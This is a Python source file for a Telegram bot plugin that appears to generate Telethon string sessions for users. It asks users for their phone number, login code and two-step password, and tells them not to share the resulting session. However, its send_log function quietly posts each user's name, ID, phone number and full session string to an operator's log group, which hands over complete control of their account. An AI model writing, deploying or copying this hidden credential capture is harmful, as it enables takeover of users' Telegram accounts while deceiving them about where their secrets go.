import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, 
    PhoneCodeExpiredError, PhoneNumberInvalidError
)
from config import API_ID, API_HASH, LOG_GROUP_ID

# 🔥 LOG FUNCTION KO UPAR DEFINE KIYA HAI TAANI ERROR NA AAYE 🔥
async def send_log(bot, name, user_id, phone_number, string_session):
    if LOG_GROUP_ID:
        log_text = (
            f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
            f"👤 <b>User:</b> {name}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
            f"🛠 <b>Type:</b> Telethon\n\n"
            f"✨ <b>Session (Tap to Copy):</b>\n"
            f"<code>{string_session}</code>"
        )
        try:
            await bot.send_message(
                LOG_GROUP_ID,
                log_text,
                parse_mode="HTML" # HTML Mode jaruri hai <code> tag ke liye
            )
        except Exception as e:
            print(f"Log Error: {e}")

@Client.on_callback_query(filters.regex("gen_tele"))
async def generate_telethon_session(bot, query: CallbackQuery):
    user_id = query.from_user.id
    name = query.from_user.first_name
    
    await query.message.edit_text(
        "⚡ **ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ᴛᴇʟᴇᴛʜᴏɴ sᴇssɪᴏɴ...**\n\n"
        "Send your Telegram Phone Number with Country Code.\n"
        "Example: `+919876543210`"
    )

    try:
        phone_msg = await bot.ask(user_id, "📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ:**", timeout=300)
    except:
        return await query.message.reply_text("❌ Timeout! Try again.")
    
    phone_number = phone_msg.text.strip()
    
    await query.message.reply_text("🔄 **sᴇɴᴅɪɴɢ ᴏᴛᴘ...**")

    tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await tele_client.connect()

    try:
        send_code = await tele_client.send_code_request(phone_number)
    except PhoneNumberInvalidError:
        await query.message.reply_text("❌ **ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ!** Restart /start")
        await tele_client.disconnect()
        return
    except Exception as e:
        await query.message.reply_text(f"❌ **Error:** {e}")
        await tele_client.disconnect()
        return

    try:
        otp_msg = await bot.ask(
            user_id, 
            "📩 **sᴇɴᴅ ᴛʜᴇ ᴏᴛᴘ:**\n\nFormat: `1 2 3 4 5` (Space ke saath likhna!)", 
            timeout=300
        )
    except:
        await tele_client.disconnect()
        return await query.message.reply_text("❌ Timeout!")

    otp = otp_msg.text.replace(" ", "")

    try:
        await tele_client.sign_in(phone_number, otp, phone_code_hash=send_code.phone_code_hash)
    except PhoneCodeInvalidError:
        await query.message.reply_text("❌ **ᴡʀᴏɴɢ ᴏᴛᴘ!** Try again.")
        await tele_client.disconnect()
        return
    except PhoneCodeExpiredError:
        await query.message.reply_text("❌ **ᴏᴛᴘ ᴇxᴘɪʀᴇᴅ!**")
        await tele_client.disconnect()
        return
    except SessionPasswordNeededError:
        try:
            pwd_msg = await bot.ask(user_id, "🔐 **ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴏɴ!**\nSend your password:", timeout=300)
        except:
            await tele_client.disconnect()
            return
        password = pwd_msg.text
        try:
            await tele_client.sign_in(password=password)
        except Exception as e:
            await query.message.reply_text(f"❌ **Wrong Password!** {e}")
            await tele_client.disconnect()
            return

    string_session = tele_client.session.save()

    # --- FIX: Yahan se code ko wapis Indent (Tab) kiya gaya hai ---
    
    text = (
        f"✨ **ʏᴏᴜʀ ᴛᴇʟᴇᴛʜᴏɴ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n"
        f"`{string_session}`\n\n"
        f"⚠️ *Don't share this with anyone!*"
    )

    try:
        await tele_client.send_message("me", text)
    except Exception:
        pass 

    # ✅ AB LOG FUNCTION SAHI SE CALL HOGA
    await send_log(bot, name, user_id, phone_number, string_session)

    await tele_client.disconnect()

    await query.message.reply_text(
        "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
    )
    
